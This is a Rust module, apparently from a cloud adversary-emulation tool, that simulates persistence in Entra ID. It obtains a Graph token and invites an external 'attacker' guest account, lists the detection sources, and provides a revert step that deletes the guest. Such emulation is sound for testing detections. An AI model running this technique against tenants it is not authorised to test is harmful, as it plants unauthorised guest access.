use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const ATTACKER_EMAIL: &str = "attacker@external-evil.com";

async fn graph_token() -> Result<String> {
    let tenant_id = std::env::var("AZURE_TENANT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_TENANT_ID env var not set"))?;
    let client_id = std::env::var("AZURE_CLIENT_ID")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_ID env var not set"))?;
    let client_secret = std::env::var("AZURE_CLIENT_SECRET")
        .map_err(|_| anyhow::anyhow!("AZURE_CLIENT_SECRET env var not set"))?;
    let url = format!(
        "https://login.microsoftonline.com/{}/oauth2/v2.0/token",
        tenant_id
    );
    let http = reqwest::Client::new();
    let params = [
        ("client_id", client_id.as_str()),
        ("client_secret", client_secret.as_str()),
        ("scope", "https://graph.microsoft.com/.default"),
        ("grant_type", "client_credentials"),
    ];
    let resp: serde_json::Value = http
        .post(&url)
        .form(&params)
        .send()
        .await?
        .json()
        .await?;
    resp["access_token"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("No access_token in response"))
        .map(str::to_string)
}

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = graph_token().await?;
    let http = reqwest::Client::new();

    let url = "https://graph.microsoft.com/v1.0/invitations";

    let body = serde_json::json!({
        "invitedUserEmailAddress": ATTACKER_EMAIL,
        "inviteRedirectUrl": "https://myapps.microsoft.com",
        "invitedUserDisplayName": "Stratus Red Team Attacker",
        "sendInvitationMessage": false
    });

    let resp = http
        .post(url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 201 {
        let data: serde_json::Value = resp.json().await?;
        let user_id = data["invitedUser"]["id"].as_str().unwrap_or("unknown");
        println!(
            "Invited external guest user '{}' (userId: {}) — attacker has a guest account in the tenant",
            ATTACKER_EMAIL, user_id
        );
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!("Failed to invite guest user ({}): {}", status, text);
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = graph_token().await?;
    let http = reqwest::Client::new();

    // Find the invited user by email
    let search_url = format!(
        "https://graph.microsoft.com/v1.0/users?$filter=mail eq '{}' or userPrincipalName eq '{}'",
        ATTACKER_EMAIL, ATTACKER_EMAIL
    );
    let search_resp: serde_json::Value = http
        .get(&search_url)
        .bearer_auth(&token)
        .send()
        .await?
        .json()
        .await?;

    let users = search_resp["value"]
        .as_array()
        .ok_or_else(|| anyhow::anyhow!("No users found"))?;

    if users.is_empty() {
        println!("Guest user '{}' not found — may have already been removed", ATTACKER_EMAIL);
        return Ok(());
    }

    for user in users {
        let user_id = user["id"].as_str().unwrap_or("");
        let del_url = format!("https://graph.microsoft.com/v1.0/users/{}", user_id);
        let del_resp = http.delete(&del_url).bearer_auth(&token).send().await?;
        if del_resp.status().is_success() || del_resp.status().as_u16() == 204 {
            println!("Deleted guest user '{}' (id: {})", ATTACKER_EMAIL, user_id);
        }
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "entra-id.persistence.guest-user",
        friendly_name: "Invite External Guest User to Entra ID Tenant",
        description: "Sends an Entra ID B2B invitation to an external attacker-controlled email address, creating a guest account in the tenant that can be assigned roles and access resources.",
        detection: "Entra ID audit log: Invite external user. Microsoft Sentinel: External user invitation alert.",
        platform: Platform::EntraId,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: Some(revert),
    }
}
